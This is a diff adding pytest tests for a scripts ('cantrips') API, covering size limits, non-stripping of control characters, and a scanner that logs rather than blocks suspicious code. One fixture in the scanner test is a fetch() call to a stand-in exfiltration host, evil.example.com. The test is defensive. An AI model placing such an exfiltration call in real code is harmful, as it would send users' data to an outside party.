@@ -663,6 +663,48 @@ class TestCantripCRUD:
         resp = await client.get("/api/cantrips/nonexistent-id")
         assert resp.status_code == 404
 
+    @pytest.mark.asyncio
+    async def test_create_exceeds_size_limit(self, admin_client):
+        from app.services.admin import update_admin_settings
+        client, _, _ = admin_client
+        await update_admin_settings({"max_script_size_kb": 1})
+        resp = await client.post("/api/cantrips", json={
+            "name": "TooBig", "code": "x = 1;" * 500,
+        })
+        assert resp.status_code == 413
+        await update_admin_settings({"max_script_size_kb": 50})
+
+    @pytest.mark.asyncio
+    async def test_update_exceeds_size_limit(self, admin_client):
+        from app.services.admin import update_admin_settings
+        client, _, _ = admin_client
+        create = await client.post("/api/cantrips", json={"name": "Small", "code": "const x = 1;"})
+        cantrip_id = create.json()["id"]
+        await update_admin_settings({"max_script_size_kb": 1})
+        resp = await client.put(f"/api/cantrips/{cantrip_id}", json={"code": "x = 1;" * 500})
+        assert resp.status_code == 413
+        await update_admin_settings({"max_script_size_kb": 50})
+
+    @pytest.mark.asyncio
+    async def test_create_with_suspicious_pattern_is_not_blocked(self, admin_client):
+        """Safety scanner findings are logged, not blocking, at create time (see
+        Planning/security-control-document.md — no override-UI in this pass)."""
+        client, _, _ = admin_client
+        resp = await client.post("/api/cantrips", json={
+            "name": "Suspicious", "code": "fetch('https://evil.example.com/exfil');",
+        })
+        assert resp.status_code == 201
+
+    @pytest.mark.asyncio
+    async def test_create_does_not_mangle_code_with_control_chars(self, admin_client):
+        """Cantrip code is never run through control-char stripping (unlike text
+        content) since that could corrupt valid source — see content_guard."""
+        client, _, _ = admin_client
+        code = "const x = 1;\tconst y = 2;\n"
+        resp = await client.post("/api/cantrips", json={"name": "Tabbed", "code": code})
+        assert resp.status_code == 201
+        assert resp.json()["code"] == code
+
 
 # ============================================================================
 # API: Script Test Endpoint
